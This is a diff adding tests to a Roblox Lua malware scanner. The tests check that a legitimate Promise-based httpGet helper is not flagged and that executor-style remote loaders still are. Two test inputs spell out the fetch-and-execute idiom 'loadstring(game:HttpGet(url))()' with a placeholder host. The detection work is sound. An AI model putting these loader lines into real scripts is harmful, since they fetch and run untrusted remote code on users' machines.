@@ -314,6 +314,54 @@ test('an executor script hub is caught by globals that cannot exist in the Roblo
 });
 
 // ================================================================================================
+//[[ A function of one's own called `httpGet`. Found in the wild, and it condemned a library.
+//
+//   `evaera/roblox-lua-promise` is one of the most widely used packages in the Roblox
+//   ecosystem. Its `docs/WhyUsePromises.md` teaches Promises by wrapping `HttpService:GetAsync`
+//   in a helper, and the scanner classified the repository as an `executor` on five hits inside
+//   that tutorial. The detector's own comment justifies itself with "`game:HttpGet` is an
+//   executor extension" — reasoning that applies to the RECEIVER form and not to a bare
+//   identifier, which is what the pattern actually matched.
+//
+//   Both halves are asserted: the honest helper is safe, and the executor idiom it was written
+//   to catch is still caught. ]]
+const LEGIT_HTTPGET_HELPER = `
+local HttpService = game:GetService("HttpService")
+
+local function httpGet(url)
+	return Promise.new(function(resolve, reject)
+		local ok, body = pcall(function()
+			return HttpService:GetAsync(url)
+		end)
+		if ok then resolve(body) else reject(body) end
+	end)
+end
+
+local promise = httpGet("https://google.com")
+return httpGet
+`;
+
+test('a local helper named httpGet is not an executor', () => {
+  const v = scan({ path: 'docs/WhyUsePromises.md', source: LEGIT_HTTPGET_HELPER });
+  assert.equal(v.safe, true, `condemned as ${v.class}: ${v.reason}`);
+});
+
+test('but the receiver form it was written to catch still is', () => {
+  const v = scan({ path: 'hub/main.lua', source: 'loadstring(game:HttpGet("https://x.tld/a.lua"))()' });
+  assert.equal(v.safe, false);
+  //[[ `remote-payload-loader`, not `executor`, and the difference is the point of
+  //   SECURITY_CLASSES being ordered "by SPECIFICITY, not by badness". Both detectors fire —
+  //   the fetch AND the loadstring — so the class chosen is the pair, which tells a reviewer
+  //   what the file DOES rather than merely what family it belongs to. This assertion was
+  //   written expecting `executor` and the scanner was right. ]]
+  assert.equal(v.class, 'remote-payload-loader');
+});
+
+test('and any receiver, not only `game`', () => {
+  const v = scan({ path: 'hub/main.lua', source: 'local g = game\nloadstring(g:HttpGet(url))()' });
+  assert.equal(v.safe, false);
+});
+
 // FALSE POSITIVES. These must come back safe. They are the reason anyone leaves the scanner on.
 // ================================================================================================
 
